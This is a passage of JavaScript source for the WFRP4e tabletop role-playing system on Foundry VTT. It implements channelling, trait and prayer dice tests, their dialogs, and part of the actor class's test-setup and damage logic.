      if (Number(SL) == 0 && game.settings.get("wfrp4e", "extendedTests"))
        SL = 1;

      }
      else // If outcome == failure 
      {
        // Optional Rule: If SL in extended test is -/+0, counts as -/+1
        if (Number(SL) == 0 && game.settings.get("wfrp4e", "extendedTests"))
        SL = -1;
      }

    //@HOUSE
    if(this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.ingredientMode == 'power' && this.result.ingredientConsumed && this.succeeded) {
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
      SL = Number(SL) * 2;
    }
    //@HOUSE

    // Optional Rule: If SL in a channel attempt SL is negative, set SL to 0
    // This is tested after the previous rule so:
    // SL == 0 triggers previous rule and sets SL to -1, SL == -1 triggers this rule and sets SL 0
    // SL < 0 doesn't trigger previous rule, SL < 0 triggers this rule and sets SL 0 
    // In both cases SL resolves to 0 as expected by this rule.
    // "SL < 0" is used over "SL <= 0" since if previous rule isn't True SL 0 resolves no channel progress
    if (Number(SL) < 0 && game.settings.get("wfrp4e", "channelingNegativeSLTests"))
      SL = 0;

    // // If channelling test was edited, make sure to adjust the SL accordingly
    // if (this.context.previousResult?.previousChannellingSL > 0)
    // {
    //   channellDelta = SL - parseInt(this.context.previousResult.SL)
    // }

    

    //@HOUSE
    if(this.preData.unofficialGrimoire && (this.item.cn.SL + SL) > this.item.cn.value) {
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire-overchannelling");
      this.result.overchannelling = this.item.cn.SL + SL - this.item.cn.value;
    }
    //@HOUSE

    this.result.channelledSL = SL;

    if (game.settings.get("wfrp4e", "useWoMChannelling"))
    {
      if (this.result.criticalchannell)
      {
        this.result.channelledSL += this.actor.system.characteristics.wp.bonus;
      }
    }
    else 
    {

      if (this.result.criticalchannell)
      {
        this.result.channelledSL = this.item.cn.value;
      }
    }

    let SLdelta = this.result.channelledSL - (this.context.previousResult?.channelledSL || 0) + (this.context.previousResult?.pastSL || 0);

    if(SL > 0) {
      this.result.SL = "+" + SL;
    } else {
      this.result.SL = SL.toString();
    }

    let newSL = this.updateChannelledItems(SLdelta);   
    this.result.channelledDisplay = newSL.toString();
    if (!game.settings.get("wfrp4e", "useWoMChannelling"))
    {
      this.result.channelledDisplay += " / " + this.item.cn.value.toString();
    }

    if (this.result.miscastModifier) {
      if (this.result.minormis)
        this.result.minormis += ` (${this.result.miscastModifier})`;
      if (this.result.majormis)
        this.result.majormis += ` (${this.result.miscastModifier})`;
      if (this.result.catastrophicmis)
        this.result.catastrophicmis += ` (${this.result.miscastModifier})`;
    }
  }

  get hasIngredient() {

    // If channelling with ingredients isn't allowed, always return false 
    // HOWEVER: Witchcraft specifies: "channeling or casting spells from this Lore automatically require a roll on the Minor Miscast table unless cast with an ingredient"
    // This doesn't make any sense. So what I'm doing is if it's a witchcraft spell, and has a valid ingredient assigned, still count it, as it will have to be assumed it's used in the eventual cast?
    if (!game.settings.get("wfrp4e", "channellingIngredients") && this.item.lore.value != "witchcraft")
    {
      return false 
    }
    else 
    {
      return this.item.ingredient && this.item.ingredient.quantity.value > 0
    }
  }


  // Channelling should not show any effects to apply 
  get damageEffects() 
  {
      return [];
  }

  get targetEffects() 
  {
      return [];
  }

  get areaEffects() 
  {
      return [];
  }

  get spell() {
    return this.item
  }

  // WoM channelling updates all items of the lore channelled
  updateChannelledItems(slDelta)
  {
    let items = [this.item];
    if (game.settings.get("wfrp4e", "useWoMChannelling"))
    {
      items = this.actor.items.filter(s => s.type == "spell" && s.system.lore.value == this.spell.system.lore.value);
    }

    items = items.map(i => i.toObject());
    items.forEach(i => {
      i.system.cn.SL += slDelta;
      let computedCN = i.system.memorized.value ? i.system.cn.value : i.system.cn.value * 2;

      // THIS WHOLE PROCESS CAN GO TO HELL
      // Cap SL to CN if WoM channelling is disabled
      if (!game.settings.get("wfrp4e", "useWoMChannelling"))
      {
        this.result.pastSL = i.system.cn.SL - computedCN; // Needed to accurately account for edits and change in SL
        i.system.cn.SL = Math.min(computedCN, i.system.cn.SL);
      }
      if (i.system.cn.SL < 0)
      {
        this.result.pastSL = i.system.cn.SL;
      }
      i.system.cn.SL = Math.max(0, i.system.cn.SL); 
    });

    this.actor.updateEmbeddedDocuments("Item", items);
    return items[0].system.cn.SL
  }

}

class ChannellingDialog extends SkillDialog {

    subTemplate = "systems/wfrp4e/templates/dialog/channel-dialog.hbs";
    chatTemplate = "systems/wfrp4e/templates/chat/roll/channel-card.hbs"
    testClass = ChannelTest

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["channel-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.data.spell
    }

    get spell() 
    {
      return this.item;
    }

    static async setup(fields={}, data={}, options={})
    {
        let spell = data.spell;
        options.title = options.title || game.i18n.localize("ChannellingTest") + " - " + spell.name;
        options.title += options.appendTitle || "";

        if (spell.system.wind && spell.system.wind.value) 
        {
            data.skill = data.actor.itemTypes["skill"].find(i => i.name.toLowerCase() == spell.system.wind.value.toLowerCase());
        }
        else if (spell.system.lore.value == "witchcraft")
        {
            data.skill = data.actor.itemTypes["skill"].find(x => x.name.toLowerCase().includes(game.i18n.localize("NAME.Channelling").toLowerCase()));
        }
        else 
        {
            data.skill = data.actor.itemTypes["skill"].find(x => x.name.includes(game.wfrp4e.config.magicWind[spell.system.lore.value]));
        }
        data.characteristic = data.skill?.system.characteristic.key || "wp";

        data.scripts = data.scripts.concat(data.spell?.getScripts("dialog"), data.skill?.getScripts("dialog") || []);
        data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);


        return new Promise(resolve => {
            let dlg = new this(fields, data, resolve, options);
            if (options.bypass)
            {
                dlg.bypass();
            }
            else 
            {
                dlg.render(true);
            }
        })
    }

    _constructTestData()
    {
        let data = super._constructTestData();
        data.item = this.data.spell.id;
        return data;
    }

    _computeAdvantage()
    {
        // @HOUSE
        if (game.settings.get("wfrp4e", "mooMagicAdvantage"))
        {
            return super._computeAdvantage();
        }
        else 
        {
            return 0;
        }
    }

    // Backwards compatibility for effects
    get type() 
    {
        return "channelling";
    }
}

class TraitTest extends AttackTest {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return
    this.preData.charging = data.charging || false;
    this.preData.options.characteristicToUse = data.characteristicToUse;
    this.computeTargetNumber();
  }

  computeTargetNumber() {

    try {
      // Use skill total if characteristics match, otherwise add the total up manually
      if (this.preData.options.characteristicToUse && this.preData.options.characteristicToUse != this.item.rollable.rollCharacteristic)
        this.result.target = this.actor.characteristics[this.preData.options.characteristicToUse].value;
      else
        this.result.target = this.actor.characteristics[this.item.rollable.rollCharacteristic].value;

      let skill = this.item.system.getSkillToUse(this.actor);

      if (skill)
        this.result.target += skill.advances.value;
    }
    catch
    {
      this.result.target += skill.advances.value;
    }

    super.computeTargetNumber();
  }
  
  async runPreEffects() {
    await super.runPreEffects();
    await Promise.all(this.actor.runScripts("preRollTraitTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("preRollTraitTest", { test: this, chatOptions: this.context.chatOptions }));
  }

  async runPostEffects() {
    await super.runPostEffects();
    await Promise.all(this.actor.runScripts("rollTraitTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("rollTraitTest", { test: this, chatOptions: this.context.chatOptions }));
    Hooks.call("wfrp4e:rollTraitTest", this, this.context.chatOptions);
  }

  async calculateDamage() {
    try {
      // If the specification of a trait is a number, it's probably damage. (Animosity (Elves) - not a number specification: no damage)
      if (this.item.rollable.damage) {
        let damageBreakdown = this.result.breakdown.damage;
        this.result.additionalDamage = this.preData.additionalDamage || 0;

        await super.calculateDamage(this.item.rollable.SL ? Number(this.result.SL) : 0);
        damageBreakdown.item = `+${this.item.Damage} (${[this.item.system.specification.value, game.wfrp4e.config.characteristicsAbbrev[this.item.system.rollable.bonusCharacteristic]].filter(i => i).join(" + ")})`;

        if (this.item.rollable.dice && !this.result.additionalDamage) {
          let roll = await new Roll(this.item.rollable.dice).roll();
          this.result.diceDamage = { value: roll.total, formula: roll.formula };
          this.preData.diceDamage = this.result.diceDamage;
          damageBreakdown.other.push({label : game.i18n.localize("BREAKDOWN.Dice"), value : roll.total});
          this.result.additionalDamage += roll.total;
          this.preData.additionalDamage  = this.result.additionalDamage;
        }

        //@HOUSE
        if (game.settings.get("wfrp4e", "mooRangedDamage"))
        {
          game.wfrp4e.utility.logHomebrew("mooRangedDamage");
          if (this.item.isRanged)
          {
            let damageMod = (Math.floor(this.targetModifiers / 10) || 0);
            this.result.damage -= damageMod;
            damageBreakdown.other.push({label : game.i18n.localize("BREAKDOWN.Moo"), value : - damageMod});
            if (this.result.damage < 0)
              this.result.damage = 0;
          }
        }
        //@/HOUSE

      }
    }
    catch (error) {
      ui.notifications.error(game.i18n.localize("CHAT.DamageError") + " " + error);
    } // If something went wrong calculating damage, do nothing and still render the card

  }

  get trait() {
    return this.item
  }

}

class TraitDialog extends AttackDialog {

    testClass = TraitTest
    subTemplate = "systems/wfrp4e/templates/dialog/weapon-dialog.hbs";
    chatTemplate = "systems/wfrp4e/templates/chat/roll/weapon-card.hbs"

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["trait-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.data.trait
    }

    get trait() 
    {
      return this.item;
    }

    static async setup(fields={}, data={}, options={})
    {
        if (!data.trait.id)
        {
            data.trait = new CONFIG.Item.documentClass(data.trait, { parent: this.actor});
        }
        let trait = data.trait;

        // TODO account for skill 
        options.title = options.title || game.wfrp4e.config.characteristics[trait.rollable.rollCharacteristic] + ` ${game.i18n.localize("Test")} - ` + trait.name;
        options.title += options.appendTitle || "";
  
      if (!trait.rollable.value)
      {
        return ui.notifications.notify("Non-rollable trait");
      }

      data.skill = data.actor.itemTypes["skill"].find(sk => sk.name == trait.rollable.skill);
      data.characteristic = data.skill?.system.characteristic.key || trait.rollable.rollCharacteristic;
      data.hitLocationTable = game.wfrp4e.tables.getHitLocTable(data.targets[0]?.actor?.details?.hitLocationTable?.value || "hitloc");

      if (trait.attackType == "melee")
      {
        data.chargingOption = true;
      }
      

      data.scripts = data.scripts.concat(data.trait?.getScripts("dialog"), data.skill?.getScripts("dialog") || []);
      data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);


      return new Promise(resolve => {
        let dlg = new this(fields, data, resolve, options);
        if (options.bypass)
        {
            dlg.bypass();
        }
        else 
        {
            dlg.render(true);
        }
    })
    }

    _constructTestData()
    {
        let data = super._constructTestData();
        data.item = this.data.trait.id || this.data.trait.toObject();
        data.characteristicToUse = this.data.characteristic;
        return data;
    }
  
    

    _defaultDifficulty()
    {
        return this.item.rollable.defaultDifficulty || super._defaultDifficulty()
    }

    // Backwards compatibility for effects
    get type() 
    {
      return "trait";
    }
}

class PrayerTest extends TestWFRP {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return
    this.computeTargetNumber();

  }

  computeTargetNumber() {
    let skill = this.item.system.getSkillToUse(this.actor);
    if (!skill)
      this.result.target = this.actor.characteristics.fel.value;
    else
      this.result.target = skill.total.value;

    super.computeTargetNumber();
  }

  async runPreEffects() {
    await super.runPreEffects();
    await Promise.all(this.actor.runScripts("preRollPrayerTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("preRollPrayerTest", { test: this, chatOptions: this.context.chatOptions }));
  }

  async runPostEffects() {
    await super.runPostEffects();
    await Promise.all(this.actor.runScripts("rollPrayerTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("rollPrayerTest", { test: this, chatOptions: this.context.chatOptions }));
    Hooks.call("wfrp4e:rollPrayerTest", this, this.context.chatOptions);
  }

  async computeResult() {
    await super.computeResult();
    let SL = this.result.SL;
    let currentSin = this.actor.status.sin.value;
    this.result.overcast = foundry.utils.duplicate(this.item.overcast);

    // Test itself failed
    if (this.failed) {
      this.result.description = game.i18n.localize("ROLL.PrayRefused");

      // Wrath of the gads activates if ones digit is equal or less than current sin
      let unitResult = Number(this.result.roll.toString().split('').pop());
      if (unitResult == 0)
        unitResult = 10;
      if (this.result.roll % 11 == 0 || unitResult <= currentSin) {
        if (this.result.roll % 11 == 0)
          this.result.color_red = true;

        this.result.wrath = game.i18n.localize("ROLL.Wrath");
        this.result.wrathModifier = Number(currentSin) * 10;
      }
    }
    // Test succeeded
    else {
      this.result.description = game.i18n.localize("ROLL.PrayGranted");

      // Wrath of the gads activates if ones digit is equal or less than current sin      
      let unitResult = Number(this.result.roll.toString().split('').pop());
      if (unitResult == 0)
        unitResult = 10;
      if (unitResult <= currentSin) {
        this.result.wrath = game.i18n.localize("ROLL.Wrath");
        this.result.wrathModifier = Number(currentSin) * 10;
      }
    }

    this.result.overcasts = Math.max(0, Math.floor(SL / 2)); // For allocatable buttons
    this.result.overcast.total = this.result.overcasts;
    this.result.overcast.available = this.result.overcast.total;

    await this.calculateDamage();
  }


  async calculateDamage() {
    let damageBreakdown = this.result.breakdown.damage;
    this.result.additionalDamage = this.preData.additionalDamage || 0;
    // Calculate damage if prayer specifies
    try {
      if (this.item.DamageString && this.succeeded)
      {
        this.result.damage = Number(this.item.Damage);
        damageBreakdown.base = `${this.item.Damage} (Prayer)`;
      }
      if (this.item.damage.addSL)
      {
        this.result.damage = Number(this.result.SL) + (this.result.damage || 0);
        damageBreakdown.other.push({label : game.i18n.localize(`SL`), value : this.result.SL});
      }

      if (this.item.damage.dice && !this.result.additionalDamage) {
        let roll = await new Roll(this.item.damage.dice).roll();
        this.result.diceDamage = { value: roll.total, formula: roll.formula };
        this.preData.diceDamage = this.result.diceDamage;
        this.result.additionalDamage += roll.total;
        damageBreakdown.other.push({label : game.i18n.localize("BREAKDOWN.Dice"), value : roll.total});
        this.preData.additionalDamage = this.result.additionalDamage;
      }
    }
    catch (error) {
      ui.notifications.error(game.i18n.localize("ErrorDamageCalc") + ": " + error);
    } // If something went wrong calculating damage, do nothing and still render the card
  }

  async postTest() {
    if (this.result.wrath) {
      let sin = this.actor.status.sin.value - 1;
      if (sin < 0) sin = 0;
      this.actor.update({ "system.status.sin.value": sin });
      ui.notifications.notify(game.i18n.localize("SinReduced"));
    }
  }

  
  // @@@@@@@ Overcast functions placed in root class because it is used by both spells and prayers @@@@@@@
  async _overcast(choice) {
    if (this.result.overcast.usage[choice].AoE && !this.item.system.target.extendableAoE) {
      ui.notifications.error(game.i18n.localize("ERROR.PrayerAoEOvercast"));
    } else {
      await super._overcast(choice);
    }
  }

  get prayer() {
    return this.item
  }
}

class PrayerDialog extends SkillDialog {

    testClass = PrayerTest
    subTemplate = ""
    chatTemplate = "systems/wfrp4e/templates/chat/roll/prayer-card.hbs"

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["prayer-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.data.prayer
    }

    get prayer() 
    {
      return this.item;
    }

    static async setup(fields={}, data={}, options={})
    {
        let prayer = data.prayer;
        options.title = options.title || game.i18n.localize("PrayerTest") + " - " + prayer.name;
        options.title += options.appendTitle || "";

        data.skill = data.actor.itemTypes["skill"].find(i => i.name.toLowerCase() == game.i18n.localize("NAME.Pray").toLowerCase());
        data.characteristic = data.skill?.system.characteristic.key || "fel";

        data.scripts = data.scripts.concat(data.prayer?.getScripts("dialog"), data.skill?.getScripts("dialog") || []);
        data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);


        return new Promise(resolve => {
            let dlg = new this(fields, data, resolve, options);
            if (options.bypass)
            {
                dlg.bypass();
            }
            else 
            {
                dlg.render(true);
            }
        })
    }

    _constructTestData()
    {
        let data = super._constructTestData();
        data.item = this.data.prayer.id;
        return data;
    }

    // Backwards compatibility for effects
    get type() 
    {
        return "prayer";
    }
}

/**
 * Provides the main Actor data computation and organization.
 *
 * ActorWfrp4e contains all the preparation data and methods used for preparing an actor:
 * going through each Owned Item, preparing them for display based on characteristics.
 * Additionally, it handles all the different types of roll requests, setting up the
 * test dialog, how each test is displayed, etc.
 *
 * @extends Actor
 * @mixes WFRP4eDocumentMixin
 * @category - Documents
 *
 * @see   ActorSheetWfrp4e - Base sheet class
 * @see   ActorSheetWfrp4eCharacter - Character sheet class
 * @see   ActorSheetWfrp4eNPC - NPC sheet class
 * @see   ActorSheetWfrp4eCreature - Creature sheet class
 * @see   ChatWFRP4e - Sends test data to roll tests.
 */
class ActorWfrp4e extends WFRP4eDocumentMixin(Actor)
{

  /**
   *
   * Set initial actor data based on type
   * 
   * @param {Object} data        Barebones actor data which this function adds onto.
   * @param {Object} options     (Unused) Additional options which customize the creation workflow.
   *
   */
  async _preCreate(data, options, user) {

    let migration = game.wfrp4e.migration.migrateActorData(this);
    this.updateSource({ effects: game.wfrp4e.migration.removeLoreEffects(data) }, { recursive: false });

    if (!foundry.utils.isEmpty(migration)) {
      this.updateSource(migration);
      WFRP_Utility.log("Migrating Actor: " + this.name, true, migration);
    }

    await super._preCreate(data, options, user);
    let preCreateData = {};

    if (!data.items?.length && !options.skipItems)
      preCreateData.items = await this._getNewActorItems();
    else
      preCreateData.items = this.items.map(i => foundry.utils.mergeObject(i.toObject(), game.wfrp4e.migration.migrateItemData(i), { overwrite: true }));

    if (data.effects?.length)
      preCreateData.effects = this.effects.map(i => foundry.utils.mergeObject(i.toObject(), game.wfrp4e.migration.migrateEffectData(i), { overwrite: true }));

    this.updateSource(preCreateData);
  }


  async _onUpdate(data, options, user) {
    await super._onUpdate(data, options, user);

    if (options.deltaWounds) {
      this._displayScrollingChange(options.deltaWounds > 0 ? "+" + options.deltaWounds : options.deltaWounds);
    }
    if (options.deltaAdv) {
        this._displayScrollingChange(options.deltaAdv, { advantage: true });
    }
  }

  async _onCreate(data, options, user) {
    if (game.user.id != user) {
      return
    }

    await super._onCreate(data, options, user);
    // this.system.checkSize();
  }

  _onCreateDescendantDocuments(...args) {
    super._onCreateDescendantDocuments(...args);
    this._checkAuras(...args);
  }
  _onUpdateDescendantDocuments(...args) {
    super._onUpdateDescendantDocuments(...args);
    this.renderTokenAuras();
  }
  _onDeleteDescendantDocuments(...args) {
    super._onCreateDescendantDocuments(...args);
    this._checkAuras(...args);
  }

  _checkAuras(parent, collection, documents, data, options, userId)
  {
    let effects;
    if (collection == "items")
    {
      effects = documents.reduce((effects, item) => effects.concat(item.effects.contents), []);
    }
    else if (collection == "effects")
    {
      effects = documents;
    }

    // If an item (or targeted aura effect) is added or removed, need to refresh and rerender area effects
    if(effects.some(e => e.applicationData.type == "aura"))
    {
      this.renderTokenAuras();
      AreaHelpers.checkAreas();
    }
  }

  prepareBaseData() {
    this.propagateDataModels(this.system, "runScripts", this.runScripts.bind(this));
    this._itemTypes = null;
    this.system.computeBase();
  }

  prepareDerivedData() {
    this.system.computeDerived();

    //TODO Move prepare-updates to hooks?
    if (this.type != "vehicle") {
      if (game.actors && this.inCollection) // Only check system effects if past this: isn't an on-load prepareData and the actor is in the world (can be updated)
        this.checkSystemEffects();
    }
  }


  get conditions() {
    return this.effects.filter(e => e.isCondition)
  }

  // Shared setup data for all different dialogs
  // Each dialog also has its own "setup" function
  _setupTest(dialogData, dialogClass)
  {
    dialogData.data.actor = this;
    dialogData.data.targets = [];
    dialogData.data.scripts = [];
    if (!dialogData.options.skipTargets)
    {
      dialogData.data.targets = Array.from(game.user.targets);
      dialogData.data.scripts = foundry.utils.deepClone((dialogData.data.targets 
        .map(t => t.actor)
        .filter(actor => actor)
        .reduce((prev, current) => prev.concat(current.getScripts("dialog", (s) => s.options.dialog?.targeter)), []) // Retrieve targets' targeter dialog effects
        .concat(this?.getScripts("dialog", (s) => !s.options.dialog?.targeter) // Don't use our own targeter dialog effects
        ))) || [];
    }
    else 
    {
      dialogData.data.scripts = this?.getScripts("dialog", (s) => !s.options.dialog?.targeter); // Don't use our own targeter dialog effects
    }




    dialogData.data.other = []; // Container for miscellaneous data that can be freely added onto

    if (dialogData.options.context) {
      if (typeof dialogData.options.context.general === "string")
        dialogData.options.context.general = [dialogData.options.context.general];
      if (typeof dialogData.options.context.success === "string")
        dialogData.options.context.success = [dialogData.options.context.success];
      if (typeof dialogData.options.context.failure === "string")
        dialogData.options.context.failure = [dialogData.options.context.failure];
    }

    if (dialogData.data.hitLoc)
    {
      dialogData.fields.hitLocation = dialogData.fields.hitLocation || "roll", // Default a WS or BS test to have hit location if not specified;
      dialogData.data.hitLocationTable = game.wfrp4e.tables.getHitLocTable(dialogData.data.targets[0]?.actor?.details?.hitLocationTable?.value || "hitloc");
    }
    else 
    {
      dialogData.fields.hitLocation = "none";
    }

    return dialogClass.setup(dialogData.fields, dialogData.data, dialogData.options)
  }

  /**
   * Setup a Characteristic Test.
   *
   * Characteristics tests are the simplest test, all that needs considering is the target number of the
   * characteristic being tested, and any modifiers the user enters.
   *
   * @param {String} characteristicId     The characteristic id (e.g. "ws") - id's can be found in config.js
   *
   */
  async setupCharacteristic(characteristic, options = {}) {
    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        characteristic,
        hitLoc : (characteristic == "ws" || characteristic == "bs") && !options.reload
      },    
      options : options || {}         // Application/optional properties
    };
    // TODO: handle abort
    return this._setupTest(dialogData, CharacteristicDialog)
  }

  /**
   * Setup a Skill Test.
   *
   * Skill tests are much like Characteristic Tests in their simplicity, just with another layer of modifiers (skill advances).
   * However, there is more complication if the skill is instead for an Income test, which adds computation after the roll is
   * completed.
   *
   * @param {Object} skill    The skill item being tested. Skill items contain the advancements and the base characteristic, see template.json for more information.
   * @param {bool}   income   Whether or not the skill is being tested to determine Income.
   */
  async setupSkill(skill, options = {}) {
    if (typeof (skill) === "string") {
      let skillName = skill;
      skill = this.itemTypes["skill"].find(sk => sk.name == skill);
      if (!skill)
      {
        // Skill not found, find later and use characteristic
        skill = {
          name : skillName,
          id : "unknown",
          characteristic : {
            key : ""
          }
        };
      }
    }

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        skill,
        hitLoc : ((skill.characteristic.key == "ws" ||
                  skill.characteristic.key == "bs" ||
                  skill.name.includes(game.i18n.localize("NAME.Melee")) ||
                  skill.name.includes(game.i18n.localize("NAME.Ranged")))
                  && !options.reload)
      },    
      options : options || {}         // Application/optional properties
    };

    return this._setupTest(dialogData, SkillDialog)
    // if (options.corruption)
    //   cardOptions.rollMode = "gmroll"
  }

  /**
   * Setup a Weapon Test.
   *
   * Probably the most complicated type of Test, weapon tests' complexity comes from all the different
   * factors and variables of the different weapons available and how they might affect test results,
   * as well as ammo usage, the effects of using different skills etc.
   *
   * @param {Object} weapon   The weapon Item being used.
   * @param {bool}   event    The event that called this Test, used to determine if attack is melee or ranged.
   */
  async setupWeapon(weapon, options = {}) {

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        weapon,
        hitLoc : true
      },    
      options : options || {}         // Application/optional properties
    };
    return this._setupTest(dialogData, WeaponDialog)
  }


  /**
   * Setup a Casting Test.
   *
   * Casting tests are more complicated due to the nature of spell miscasts, ingredients, etc. Whatever ingredient
   * is selected will automatically be used and negate one miscast. For the spell rolling logic, see ChatWFRP.rollCastTest
   * where all this data is passed to in order to calculate the roll result.
   *
   * @param {Object} spell    The spell Item being Casted. The spell item has information like CN, lore, and current ingredient ID
   *
   */
  async setupCast(spell, options = {}) {

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        spell,
        hitLoc : !!spell.system.damage.value
      },    
      options : options || {}         // Application/optional properties
    };
    return this._setupTest(dialogData, CastDialog)
  }

  /**
   * Setup a Channelling Test.
   *
   * Channelling tests are more complicated due to the nature of spell miscasts, ingredients, etc. Whatever ingredient
   * is selected will automatically be used and mitigate miscasts. For the spell rolling logic, see ChatWFRP.rollChannellTest
   * where all this data is passed to in order to calculate the roll result.
   *
   * @param {Object} spell    The spell Item being Channelled. The spell item has information like CN, lore, and current ingredient ID
   * This spell SL will then be updated accordingly.
   *
   */
  async setupChannell(spell, options = {}) {

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        spell,
        hitLoc : false
      },    
      options : options || {}         // Application/optional properties
    };
    return this._setupTest(dialogData, ChannellingDialog)
  }

  /**
   * Setup a Prayer Test.
   *
   * Prayer tests are fairly simple, with the main complexity coming from sin and wrath of the gods,
   * the logic of which can be found in ChatWFRP.rollPrayerTest, where all this data here is passed
   * to in order to calculate the roll result.
   *
   * @param {Object} prayer    The prayer Item being used, compared to spells, not much information
   * from the prayer itself is needed.
   */
  async setupPrayer(prayer, options = {}) {

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        prayer,
        hitLoc : (prayer.damage.value || prayer.damage.dice || prayer.damage.addSL)
      },    
      options : options || {}         // Application/optional properties
    };
    return this._setupTest(dialogData, PrayerDialog)
  }

  /**
   * Setup a Trait Test.
   *
   * Some traits are rollable, and so are assigned a rollable characteristic, this is where
   * rolling those characteristics is setup. Additonally, sometimes these traits have a
   * "Bonus characteristic" which in most all cases means what characteristic bonus to add
   * to determine damage. See the logic in traitTest.
   *
   * @param {Object} trait   The trait Item being used, containing which characteristic/bonus characteristic to use
   */
  async setupTrait(trait, options = {}) {

    let dialogData = {
      fields : options.fields || {},  // Fields are data properties in the dialog template
      data : {                  // Data is internal dialog data
        trait,
        hitLoc : (trait.system.rollable.rollCharacteristic == "ws" || trait.system.rollable.rollCharacteristic == "bs")
      },    
      options : options || {}         // Application/optional properties
    };

    return this._setupTest(dialogData, TraitDialog) 
    //   deadeyeShot : this.has(game.i18n.localize("NAME.DeadeyeShot"), "talent") && weapon.attackType == "ranged"
  }

  setupItem(id, options={})
  {
    let item = this.items.get(id);
    switch(item?.type)
    {
      case "skill":
        return this.setupSkill(item, options);
      case "weapon":
        return this.setupWeapon(item, options);
      case "trait":
        return this.setupTrait(item, options);
      case "spell":
        return this.setupCast(item, options);
      case "prayer":
        return this.setupPrayer(item, optionts);
    }
  }


  async setupExtendedTest(item, options = {}) {

    let defaultRollMode = item.hide.test || item.hide.progress ? "gmroll" : "roll";

    if (item.SL.target <= 0)
      return ui.notifications.error(game.i18n.localize("ExtendedError1"))

    options.extended = item.uuid;
    options.rollMode = defaultRollMode;
    options.hitLocation = false;
    options.fields = {difficulty : item.system.difficulty.value || "challenging"};

    let characteristic = WFRP_Utility.findKey(item.test.value, game.wfrp4e.config.characteristics);
    if (characteristic) {
      let test = await this.setupCharacteristic(characteristic, options);
      await test.roll();
    }
    else {
      let skill = this.itemTypes["skill"].find(i => i.name == item.test.value);
      if (skill) {
        let test = await this.setupSkill(skill, options);
        await test.roll();
      } 
      else {
        ui.notifications.error(`${game.i18n.format("ExtendedError2", { name: item.test.value })}`);
      }
    }
  }


  async rollReloadTest(weapon) {
    let testId = weapon.getFlag("wfrp4e", "reloading");
    let extendedTest = weapon.actor.items.get(testId);
    if (!extendedTest) {

      //ui.notifications.error(game.i18n.localize("ITEM.ReloadError"))
      await this.checkReloadExtendedTest(weapon, this.actor);
      return
    }
    await this.setupExtendedTest(extendedTest, { reload: true, weapon, appendTitle: " - " + game.i18n.localize("ITEM.Reloading") });
  }


  /**
   * Deprecated - only used for compatibility with existing effects
   * As shown in the functions, just call `roll()` on the test object to compute the tests
   */
  async basicTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }
  async weaponTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }
  async castTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }
  async channelTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }
  async prayerTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }
  async traitTest(test, options = {}) {
    if (test.testData)
      return ui.notifications.warn(game.i18n.localize("WARNING.ActorTest"))
    await test.roll();
    return test;
  }

  //#endregion



  /**
 * Adds all missing basic skills to the Actor.
 *
 * This function will add all mising basic skills, used when an Actor is created (see create())
 * as well as from the right click menu from the Actor directory.
 *
 */
  async addBasicSkills() {
    let ownedBasicSkills = this.itemTypes["skill"].filter(i => i.advanced.value == "bsc");
    let allBasicSkills = await WFRP_Utility.allBasicSkills();

    // Filter allBasicSkills with ownedBasicSkills, resulting in all the missing skills
    let skillsToAdd = allBasicSkills.filter(s => !ownedBasicSkills.find(ownedSkill => ownedSkill.name == s.name));

    // Add those missing basic skills
    this.createEmbeddedDocuments("Item", skillsToAdd);
  }

  /**
   * Apply damage to an actor, taking into account armor, size, and weapons.
   *
   * applyDamage() is typically called at the end of an oppposed tests, where you can
   * right click the chat message and apply damage. This function goes through the
   * process of calculating and reducing damage if needede based on armor, toughness,
   * size, armor qualities/flaws, and weapon qualities/flaws
   *
   * @param {Object} victim       id of actor taking damage
   * @param {Object} opposedData  Test results, all the information needed to calculate damage
   * @param {var}    damageType   enum for what the damage ignores, see config.js
   */
  async applyDamage(opposedTest, damageType = game.wfrp4e.config.DAMAGE_TYPE.NORMAL) {
    if (!opposedTest.result.damage)
      return `<b>Error</b>: ${game.i18n.localize("CHAT.DamageAppliedError")}`
    // If no damage value, don't attempt anything
    if (!opposedTest.result.damage.value)
      return game.i18n.localize("CHAT.DamageAppliedErrorTiring");
    // Get actor/tokens for those in the opposed test
    let actor = this;
